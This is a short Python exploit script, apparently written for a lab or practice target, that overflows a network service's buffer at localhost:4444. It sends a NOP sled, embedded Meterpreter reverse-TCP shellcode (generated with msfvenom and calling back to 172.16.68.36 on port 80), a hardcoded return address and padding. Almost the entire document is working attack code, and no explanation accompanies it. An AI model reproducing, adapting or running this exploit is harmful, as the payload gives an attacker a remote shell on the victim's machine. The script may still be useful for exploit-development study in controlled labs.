import sys, struct, socket

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.68.36 LPORT=80 -a x86 -fc -b "\x0a\x0d\x00"
shellcode = ("\xd9\xcf\xbe\xb7\xb0\x8b\xe2\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x56\x83\xef\xfc\x31\x77\x14\x03\x77\xa3\x52\x7e\x1e\x23\x10"
"\x81\xdf\xb3\x75\x0b\x3a\x82\xb5\x6f\x4e\xb4\x05\xfb\x02\x38"
"\xed\xa9\xb6\xcb\x83\x65\xb8\x7c\x29\x50\xf7\x7d\x02\xa0\x96"
"\xfd\x59\xf5\x78\x3c\x92\x08\x78\x79\xcf\xe1\x28\xd2\x9b\x54"
"\xdd\x57\xd1\x64\x56\x2b\xf7\xec\x8b\xfb\xf6\xdd\x1d\x70\xa1"
"\xfd\x9c\x55\xd9\xb7\x86\xba\xe4\x0e\x3c\x08\x92\x90\x94\x41"
"\x5b\x3e\xd9\x6e\xae\x3e\x1d\x48\x51\x35\x57\xab\xec\x4e\xac"
"\xd6\x2a\xda\x37\x70\xb8\x7c\x9c\x81\x6d\x1a\x57\x8d\xda\x68"
"\x3f\x91\xdd\xbd\x4b\xad\x56\x40\x9c\x24\x2c\x67\x38\x6d\xf6"
"\x06\x19\xcb\x59\x36\x79\xb4\x06\x92\xf1\x58\x52\xaf\x5b\x34"
"\x97\x82\x63\xc4\xbf\x95\x10\xf6\x60\x0e\xbf\xba\xe9\x88\x38"
"\xcb\xfe\x2a\x96\x73\x6e\xd5\x17\x83\xa6\x12\x43\xd3\xd0\xb3"
"\xec\xb8\x20\x3b\x39\x54\x20\xab\x6e\xb8\x66\x0f\x07\xba\x66"
"\x4f\x87\x33\x80\x1f\x77\x13\x1d\xe0\x27\xd3\xcd\x88\x2d\xdc"
"\x32\xa8\x4d\x37\x5b\x43\xa2\xe1\x33\xfc\x5b\xa8\xc8\x9d\xa4"
"\x67\xb5\x9e\x2f\x8d\x49\x50\xd8\xe4\x59\x85\xbf\x06\xa2\x56"
"\x2a\x06\xc8\x52\xfc\x51\x64\x59\xd9\x95\x2b\xa2\x0c\xa6\x2c"
"\x5c\xd1\x9e\x47\x6b\x47\x9e\x3f\x94\x87\x1e\xc0\xc2\xcd\x1e"
"\xa8\xb2\xb5\x4d\xcd\xbc\x63\xe2\x5e\x29\x8c\x52\x32\xfa\xe4"
"\x58\x6d\xcc\xaa\xa3\x58\x4e\xac\x5b\x1e\x79\x15\x33\xe0\x39"
"\xa5\xc3\x8a\xb9\xf5\xab\x41\x95\xfa\x1b\xa9\x3c\x53\x33\x20"
"\xd1\x11\xa2\x35\xf8\xf4\x7a\x35\x0f\x2d\x8d\x4c\x60\xd2\x6e"
"\xb1\x68\xb7\x6f\xb1\x94\xc9\x4c\x67\xad\xbf\x93\xbb\x8a\xb0"
"\xa6\x9e\xbb\x5a\xc8\x8d\xbc\x4e")

def p32(val):
	return struct.pack('I', val)
	
def main():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('localhost', 4444))
	s.send('\x90' * (1017-len(shellcode)) + shellcode + p32(0x1048430D) + 'C' * 5)

# Hook
if __name__ == '__main__':
	main()